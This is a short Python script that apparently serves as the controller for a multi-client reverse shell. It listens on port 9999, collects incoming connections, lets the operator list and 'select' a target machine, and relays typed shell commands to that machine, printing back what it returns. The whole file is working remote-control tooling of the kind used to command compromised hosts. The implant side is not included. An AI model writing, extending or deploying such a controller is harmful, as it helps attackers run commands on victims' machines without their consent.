import sys
import socket
import threading
from queue import Queue
import time

connections = []
addresses = []


def create_socket():        # create socket
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error:", str(msg))


def bind_socket():          # Bind socket to port
    try:
        s.bind((host, port))
        s.listen(5)
        print("Socket binded and listening for connections")
    except socket.error as msg:
        print("Binding error:", str(msg))
        bind_socket()


def accept_connections():       # Accept multiple clients
    for c in connections:
        c.close()
    connections.clear()
    addresses.clear()
    while True:
        try:
            conn, address = s.accept()
            #conn.setblocking(True)
            connections.append(conn)
            addresses.append(address)
        except:
            pass


def start_control():
    while True:
        print("\nlist: Lists all the connections\nselect x: Selects x-th connection from the list\n")
        cmd = input('Multi-Client-Server>')
        if cmd == 'list':
            list_connections()
        elif cmd[:6] == 'select':
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
            else:
                print("Couldn't select the connection!\n")
                list_connections()


def list_connections():
    val = ''
    for i, conn in enumerate(connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(65536)
        except:
            del connections[i]
            continue
        val += str(i) + "\t" + str(addresses[i][0]) + ":" + str(addresses[i][1]) + "\n"
    print("-----------------Clients-----------------\n"+val+"\n")


def get_target(cmd):
    try:
        num = int(cmd.replace('select ',''))
        print("Connected to ",str(addresses[num][0]))
        print(str(addresses[num][0])+">",end="")
        return connections[num]
    except:
        return


def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd.lower() == 'exit' or cmd.lower() == 'quit':
                break

            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                response = str(conn.recv(65536),"utf-8")
                print(response, end="")

        except:
            print("Connection lost!")
            break


def connection_thread():
    create_socket()
    bind_socket()
    accept_connections()


def command_thread():
    start_control()


def main():
    t1 = threading.Thread(target=connection_thread)
    t2 = threading.Thread(target=command_thread)
    t1.start()
    time.sleep(1)
    t2.start()


main()
